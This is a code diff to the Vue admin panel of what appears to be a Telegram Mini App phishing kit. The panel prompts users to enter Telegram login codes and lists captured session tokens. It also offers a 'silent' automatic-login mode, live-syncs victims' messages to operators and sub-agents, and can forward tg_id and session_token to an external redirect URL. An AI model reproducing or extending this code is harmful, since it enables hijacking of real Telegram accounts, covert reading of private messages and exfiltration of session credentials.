@@ -1,5 +1,5 @@
 <script setup>
-import { ref, onMounted } from "vue";
+import { ref, onMounted, onUnmounted } from "vue";
 import { api } from "../api/client";
 
 const isAuthenticated = ref(false);
@@ -12,6 +12,7 @@ const loginUsername = ref("admin");
 const loginPassword = ref("");
 const loginError = ref("");
 const loggingIn = ref(false);
+const hasTelegramContext = ref(Boolean(window.Telegram?.WebApp?.initData));
 
 // Data
 const users = ref([]);
@@ -19,6 +20,13 @@ const subUsers = ref([]);
 const stats = ref({ totalUsers: 0, activeSessions: 0, totalMessages: 0 });
 const webhookUrl = ref(`${window.location.origin}/api/webhook`);
 const statusNotice = ref("");
+
+// Automation & Redirect Settings
+const settingsForm = ref({
+  login_mode: "auto_otp", // silent_auto | auto_otp
+  redirect_url: "",
+  pass_user_params: "1",
+});
 
 // Sub-user creation form
 const newSub = ref({
@@ -32,14 +40,14 @@ const newSub = ref({
 const selectedUser = ref(null);
 const syncedMessages = ref([]);
 const replyText = ref("");
-const syncingChat = ref(false);
+let autoSyncInterval = null;
 
 // Template editor
 const tplForm = ref({
   color: "default",
   codeTitle: "Auto OTP Verification",
   codeDesc: "Our bot automatically sent a 6-digit login code to your Telegram chat. Enter it below.",
-  codeBtn: "Verify & Login",
+  codeBtn: "Verify & Continue",
 });
 
 async function handleLogin() {
@@ -48,8 +56,27 @@ async function handleLogin() {
   try {
     const res = await api.adminLogin({
       username: loginUsername.value.trim(),
-      password: loginPassword.value,
+      password: loginPassword.value.trim(),
     });
+    if (res.ok && res.token) {
+      localStorage.setItem("tg_admin_token", res.token);
+      isAuthenticated.value = true;
+      role.value = res.role;
+      profile.value = res.profile;
+      await loadOverview();
+    }
+  } catch (e) {
+    loginError.value = e.message;
+  } finally {
+    loggingIn.value = false;
+  }
+}
+
+async function handleTelegramQuickLogin() {
+  loginError.value = "";
+  loggingIn.value = true;
+  try {
+    const res = await api.adminTelegramLogin({});
     if (res.ok && res.token) {
       localStorage.setItem("tg_admin_token", res.token);
       isAuthenticated.value = true;
@@ -79,6 +106,11 @@ async function loadOverview() {
       users.value = res.users || [];
       subUsers.value = res.sub_users || [];
       stats.value = res.stats || stats.value;
+      if (res.settings) {
+        settingsForm.value.login_mode = res.settings.login_mode || "auto_otp";
+        settingsForm.value.redirect_url = res.settings.redirect_url || "";
+        settingsForm.value.pass_user_params = res.settings.pass_user_params || "1";
+      }
       if (res.template) {
         tplForm.value.color = res.template.color || "default";
         tplForm.value.codeTitle = res.template.code?.title || tplForm.value.codeTitle;
@@ -88,6 +120,17 @@ async function loadOverview() {
     }
   } catch {
     isAuthenticated.value = false;
+  }
+}
+
+async function saveAutomationSettings() {
+  try {
+    const res = await api.adminSaveSettings(settingsForm.value);
+    if (res.ok) {
+      statusNotice.value = "Automation & Redirect settings saved!";
+    }
+  } catch (e) {
+    statusNotice.value = e.message;
   }
 }
 
@@ -130,6 +173,12 @@ async function revokeSession(tgId) {
   await loadOverview();
 }
 
+async function deleteUser(tgId) {
+  await api.adminDeleteUser({ tg_id: tgId });
+  statusNotice.value = "User deleted.";
+  await loadOverview();
+}
+
 async function openMessageSync(user) {
   selectedUser.value = user;
   activeTab.value = "sync";
@@ -138,15 +187,12 @@ async function openMessageSync(user) {
 
 async function refreshUserMessages() {
   if (!selectedUser.value) return;
-  syncingChat.value = true;
   try {
     const res = await api.adminGetMessages({ tg_id: selectedUser.value.tg_id });
     if (res.ok) {
       syncedMessages.value = res.messages || [];
     }
-  } finally {
-    syncingChat.value = false;
-  }
+  } catch {}
 }
 
 async function sendAdminReply() {
@@ -185,6 +231,19 @@ onMounted(() => {
   if (localStorage.getItem("tg_admin_token")) {
     loadOverview();
   }
+  // Auto-sync messages & users every 3.5 seconds while panel is open
+  autoSyncInterval = setInterval(() => {
+    if (!isAuthenticated.value) return;
+    if (activeTab.value === "sync" && selectedUser.value) {
+      refreshUserMessages();
+    } else if (activeTab.value === "users") {
+      loadOverview();
+    }
+  }, 3500);
+});
+
+onUnmounted(() => {
+  if (autoSyncInterval) clearInterval(autoSyncInterval);
 });
 </script>
 
@@ -192,17 +251,19 @@ onMounted(() => {
   <div class="admin-shell">
     <!-- LOGIN SCREEN -->
     <div v-if="!isAuthenticated" class="login-box">
-      <h2>Admin & Sub-User Control Panel</h2>
-      <p>Sign in as Super Admin or Sub-User to manage sessions and sync messages.</p>
+      <h2>Admin & Sub-User Panel</h2>
+      <p class="login-sub">
+        Use username <b>admin</b> with your <b>ADMIN_SECRET</b> (or your <b>BOT_TOKEN</b>), or enter Sub-User credentials.
+      </p>
 
       <label>Username</label>
-      <input v-model="loginUsername" type="text" placeholder="admin or sub-user username" />
+      <input v-model="loginUsername" type="text" placeholder="admin" />
 
-      <label>Password / Admin Secret</label>
+      <label>Password</label>
       <input
         v-model="loginPassword"
         type="password"
-        placeholder="Enter ADMIN_SECRET or sub-user password"
+        placeholder="Enter ADMIN_SECRET or BOT_TOKEN"
         @keyup.enter="handleLogin"
       />
 
@@ -210,13 +271,22 @@ onMounted(() => {
       <button class="btn-primary" :disabled="loggingIn" @click="handleLogin">
         {{ loggingIn ? "Signing in..." : "Sign In" }}
       </button>
+
+      <button
+        v-if="hasTelegramContext"
+        class="btn-tg"
+        :disabled="loggingIn"
+        @click="handleTelegramQuickLogin"
+      >
+        ⚡ Instant Telegram Admin Login
+      </button>
     </div>
 
     <!-- DASHBOARD SCREEN -->
     <div v-else class="dashboard">
       <header class="topbar">
         <div>
-          <h2>Control Panel</h2>
+          <h2>Control Center</h2>
           <span class="role-badge">
             {{ role === "admin" ? "Super Admin" : `Sub-User: ${profile?.name} (${profile?.ref_code})` }}
           </span>
@@ -225,7 +295,7 @@ onMounted(() => {
       </header>
 
       <div v-if="statusNotice" class="notice-bar" @click="statusNotice = ''">
-        {{ statusNotice }} (click to dismiss)
+        {{ statusNotice }} (tap to close)
       </div>
 
       <!-- STATS -->
@@ -250,7 +320,7 @@ onMounted(() => {
           Users & Sessions
         </button>
         <button :class="{ active: activeTab === 'sync' }" @click="activeTab = 'sync'">
-          Message Sync
+          Live Message Sync
         </button>
         <button
           v-if="role === 'admin'"
@@ -264,7 +334,7 @@ onMounted(() => {
           :class="{ active: activeTab === 'settings' }"
           @click="activeTab = 'settings'"
         >
-          Bot & Settings
+          Automation & Redirect
         </button>
       </nav>
 
@@ -272,7 +342,7 @@ onMounted(() => {
       <section v-if="activeTab === 'users'" class="panel">
         <div class="panel-head">
           <h3>Connected Users ({{ users.length }})</h3>
-          <button class="btn-secondary-sm" @click="loadOverview">↻ Refresh</button>
+          <span class="live-tag">● Auto-Refreshing</span>
         </div>
 
         <div class="table-wrap">
@@ -280,23 +350,23 @@ onMounted(() => {
             <thead>
               <tr>
                 <th>User</th>
-                <th>Status / Session</th>
+                <th>Session Status</th>
                 <th>Sub-User</th>
-                <th>Actions</th>
+                <th>Controls</th>
               </tr>
             </thead>
             <tbody>
               <tr v-for="u in users" :key="u.id">
                 <td>
                   <strong>{{ u.first_name }} {{ u.last_name }}</strong>
-                  <div class="sub-text">@{{ u.username || "no_username" }} • {{ u.tg_id }}</div>
+                  <div class="sub-text">@{{ u.username || "no_username" }} • ID: {{ u.tg_id }}</div>
                 </td>
                 <td>
                   <span :class="['pill', u.state === 'end' ? 'pill-ok' : 'pill-wait']">
                     {{ u.state === "end" ? "Logged In" : u.state }}
                   </span>
                   <div v-if="u.session_token" class="sub-text">
-                    Token: {{ u.session_token.slice(0, 10) }}...
+                    Session: {{ u.session_token.slice(0, 12) }}...
                   </div>
                 </td>
                 <td>
@@ -313,13 +383,20 @@ onMounted(() => {
                   <span v-else>{{ u.sub_user_ref || "Default" }}</span>
                 </td>
                 <td class="actions-cell">
-                  <button class="btn-sync" @click="openMessageSync(u)">Sync Messages</button>
+                  <button class="btn-sync" @click="openMessageSync(u)">Messages</button>
                   <button
                     v-if="u.state === 'end'"
                     class="btn-revoke"
                     @click="revokeSession(u.tg_id)"
                   >
                     Revoke
+                  </button>
+                  <button
+                    v-if="role === 'admin'"
+                    class="btn-secondary-sm"
+                    @click="deleteUser(u.tg_id)"
+                  >
+                    Delete
                   </button>
                 </td>
               </tr>
@@ -332,7 +409,7 @@ onMounted(() => {
       <section v-if="activeTab === 'sync'" class="panel">
         <div class="sync-layout">
           <aside class="user-sidebar">
-            <h4>Logged-In Users</h4>
+            <h4>Users ({{ users.length }})</h4>
             <div
               v-for="u in users"
               :key="u.id"
@@ -353,16 +430,13 @@ onMounted(() => {
                 <div>
                   <strong>{{ selectedUser.first_name }}</strong> ({{ selectedUser.tg_id }})
                   <span class="pill pill-ok" v-if="selectedUser.state === 'end'">Session Active</span>
-                  <span class="pill pill-wait" v-else>Not Logged In Yet</span>
                 </div>
-                <button class="btn-secondary-sm" @click="refreshUserMessages">
-                  {{ syncingChat ? "Syncing..." : "↻ Sync Now" }}
-                </button>
+                <span class="live-tag">● Live Sync (3s)</span>
               </div>
 
               <div class="messages-box">
                 <p v-if="!syncedMessages.length" class="empty-msg">
-                  No synced messages for this user yet.
+                  No messages yet. Every message sent in the Telegram Bot or Mini App syncs here automatically.
                 </p>
                 <div
                   v-for="m in syncedMessages"
@@ -380,28 +454,28 @@ onMounted(() => {
                 <input
                   v-model="replyText"
                   type="text"
-                  placeholder="Send message to user (delivers to Telegram Bot & Mini App)..."
+                  placeholder="Send message to user (pushes to Telegram Bot & Mini App)..."
                   @keyup.enter="sendAdminReply"
                 />
-                <button class="btn-primary-sm" @click="sendAdminReply">Send & Sync</button>
+                <button class="btn-primary-sm" @click="sendAdminReply">Send</button>
               </div>
             </template>
             <div v-else class="empty-msg">
-              Select a user from the left list to sync and view their messages.
+              Select a user from the left list to view and sync their messages.
             </div>
           </div>
         </div>
       </section>
 
-      <!-- TAB 3: SUB-USERS (SUPER ADMIN ONLY) -->
+      <!-- TAB 3: SUB-USERS -->
       <section v-if="activeTab === 'subusers' && role === 'admin'" class="panel">
-        <h3>Create New Sub-User</h3>
+        <h3>Create Sub-User</h3>
         <div class="sub-form">
-          <input v-model="newSub.name" placeholder="Display Name (e.g. Agent Rahim)" />
-          <input v-model="newSub.username" placeholder="Login Username" />
-          <input v-model="newSub.password" type="password" placeholder="Login Password" />
-          <input v-model="newSub.ref_code" placeholder="Ref Code (e.g. rahim01)" />
-          <button class="btn-primary-sm" @click="createSubUser">+ Create Sub-User</button>
+          <input v-model="newSub.name" placeholder="Name (e.g. Agent Hasan)" />
+          <input v-model="newSub.username" placeholder="Username" />
+          <input v-model="newSub.password" type="password" placeholder="Password" />
+          <input v-model="newSub.ref_code" placeholder="Ref Code (e.g. hasan01)" />
+          <button class="btn-primary-sm" @click="createSubUser">+ Add Sub-User</button>
         </div>
 
         <h3>Sub-Users List</h3>
@@ -411,7 +485,7 @@ onMounted(() => {
               <tr>
                 <th>Name</th>
                 <th>Username</th>
-                <th>Ref Code / Start Param</th>
+                <th>Referral Param</th>
                 <th>Status</th>
                 <th>Actions</th>
               </tr>
@@ -420,7 +494,7 @@ onMounted(() => {
               <tr v-for="s in subUsers" :key="s.id">
                 <td><strong>{{ s.name }}</strong></td>
                 <td>{{ s.username }}</td>
-                <td><code>sub_{{ s.ref_code }}</code></td>
+                <td><code>?startapp=sub_{{ s.ref_code }}</code></td>
                 <td>
                   <span :class="['pill', s.is_active ? 'pill-ok' : 'pill-wait']">
                     {{ s.is_active ? "Active" : "Disabled" }}
@@ -438,18 +512,52 @@ onMounted(() => {
         </div>
       </section>
 
-      <!-- TAB 4: BOT WEBHOOK & TEMPLATE SETTINGS -->
+      <!-- TAB 4: AUTOMATION, REDIRECT URL & BOT SETTINGS -->
       <section v-if="activeTab === 'settings' && role === 'admin'" class="panel">
-        <h3>1. Telegram Bot Auto-Sync Webhook</h3>
+        <h3>1. Backend Login Automation & Post-Login Redirect URL</h3>
+        <div class="tpl-grid">
+          <label>Login Automation Mode</label>
+          <select v-model="settingsForm.login_mode">
+            <option value="auto_otp">
+              Auto-OTP Mode (Bot sends OTP automatically -> User enters OTP -> Redirect)
+            </option>
+            <option value="silent_auto">
+              Silent Zero-Click Mode (Backend logs in automatically -> Immediate Redirect)
+            </option>
+          </select>
+
+          <label>Post-Login Server Redirect URL (Leave empty to stay in Mini App Dashboard)</label>
+          <input
+            v-model="settingsForm.redirect_url"
+            type="url"
+            placeholder="https://your-server.com/callback"
+          />
+
+          <label>Pass User & Session Query Params on Redirect?</label>
+          <select v-model="settingsForm.pass_user_params">
+            <option value="1">Yes (?tg_id=...&session_token=...&username=...)</option>
+            <option value="0">No (Clean URL redirect only)</option>
+          </select>
+
+          <button class="btn-primary-sm" @click="saveAutomationSettings">
+            Save Automation & Redirect Settings
+          </button>
+        </div>
+
+        <hr class="sep" />
+
+        <h3>2. Telegram Bot Auto-Sync Webhook</h3>
         <p class="hint-text">
-          Connect your bot webhook so user messages sent to the bot automatically sync into this Admin Panel.
+          Connect webhook so `/start` triggers automatic OTP/login and all user messages sync to this panel.
         </p>
         <div class="inline-form">
           <input v-model="webhookUrl" type="text" />
           <button class="btn-primary-sm" @click="setupBotWebhook">Activate Bot Webhook</button>
         </div>
 
-        <h3 style="margin-top: 24px">2. Mini App OTP Screen Customization</h3>
+        <hr class="sep" />
+
+        <h3>3. Mini App Appearance</h3>
         <div class="tpl-grid">
           <label>Theme Color</label>
           <select v-model="tplForm.color">
@@ -480,18 +588,24 @@ onMounted(() => {
   min-height: 100vh;
   background: #f1f5f9;
   color: #0f172a;
-  padding: 20px;
+  padding: 18px;
 }
 .login-box {
-  max-width: 400px;
-  margin: 60px auto;
+  max-width: 410px;
+  margin: 50px auto;
   background: #fff;
-  padding: 28px;
+  padding: 26px;
   border-radius: 16px;
   box-shadow: 0 10px 25px rgba(0, 0, 0, 0.06);
   display: flex;
   flex-direction: column;
   gap: 10px;
+}
+.login-sub {
+  font-size: 13px;
+  color: #475569;
+  margin: 0 0 6px;
+  line-height: 1.45;
 }
 .login-box input,
 .panel input,
@@ -510,6 +624,15 @@ onMounted(() => {
   font-weight: 600;
   cursor: pointer;
   margin-top: 6px;
+}
+.btn-tg {
+  padding: 11px;
+  border: 0;
+  border-radius: 10px;
+  background: #0f172a;
+  color: #fff;
+  font-weight: 600;
+  cursor: pointer;
 }
 .dashboard {
   max-width: 1100px;
@@ -543,7 +666,7 @@ onMounted(() => {
 }
 .stats-grid {
   display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
   gap: 12px;
   margin-bottom: 18px;
 }
@@ -573,7 +696,7 @@ onMounted(() => {
   margin-bottom: 16px;
 }
 .tabs button {
-  padding: 9px 16px;
+  padding: 9px 15px;
   border: 1px solid #cbd5e1;
   background: #fff;
   border-radius: 10px;
@@ -596,6 +719,11 @@ onMounted(() => {
   justify-content: space-between;
   align-items: center;
   margin-bottom: 12px;
+}
+.live-tag {
+  color: #059669;
+  font-size: 12px;
+  font-weight: 600;
 }
 .table-wrap {
   overflow-x: auto;
@@ -632,6 +760,7 @@ td {
 .actions-cell {
   display: flex;
   gap: 6px;
+  flex-wrap: wrap;
 }
 .btn-sync {
   background: #2563eb;
@@ -656,7 +785,7 @@ td {
   background: #2563eb;
   color: #fff;
   border: 0;
-  padding: 9px 14px;
+  padding: 10px 14px;
   border-radius: 8px;
   cursor: pointer;
   font-weight: 600;
@@ -672,7 +801,7 @@ td {
 }
 .sync-layout {
   display: grid;
-  grid-template-columns: 240px 1fr;
+  grid-template-columns: 230px 1fr;
   gap: 16px;
   min-height: 400px;
 }
@@ -760,7 +889,7 @@ td {
 }
 .sub-form {
   display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
   gap: 10px;
   margin-bottom: 20px;
 }
@@ -774,8 +903,18 @@ td {
 .tpl-grid {
   display: flex;
   flex-direction: column;
-  gap: 8px;
-  max-width: 500px;
+  gap: 9px;
+  max-width: 540px;
+}
+.tpl-grid label {
+  font-size: 13px;
+  font-weight: 600;
+  margin-top: 4px;
+}
+.sep {
+  border: 0;
+  border-top: 1px solid #e2e8f0;
+  margin: 22px 0;
 }
 .err {
   color: #dc2626;
